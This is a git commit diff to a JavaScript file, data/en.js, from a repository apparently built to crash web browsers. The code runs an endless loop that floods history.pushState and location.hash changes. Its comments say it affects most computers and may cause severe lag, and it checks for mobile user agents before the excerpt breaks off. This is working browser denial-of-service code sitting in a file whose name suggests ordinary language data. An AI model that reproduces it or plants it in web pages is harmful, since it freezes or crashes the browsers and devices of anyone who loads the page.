5dca7d2743d1b496d969f4c4b587aa8e1e82a39d
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 21:43:43 -0800

    Final Update

--- data/en.js
+++ data/en.js
@@ -3,13 +3,16 @@
 *   Date Created: 11/15/2021
  */
 
-// Functions For Loop
-$location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
-$vwer = '#';
-$x = Math.floor((Math.random() * 10000000000000000000) + 1);
+
 
 /* This Affects Most Computers Depending On Control */
 while(1) {
+ 
+   // Functions For Loop
+   $location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
+   $vwer = '#';
+   $x = Math.floor((Math.random() * 10000000000000000000) + 1);
+ 
    for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();   
    // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
    if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
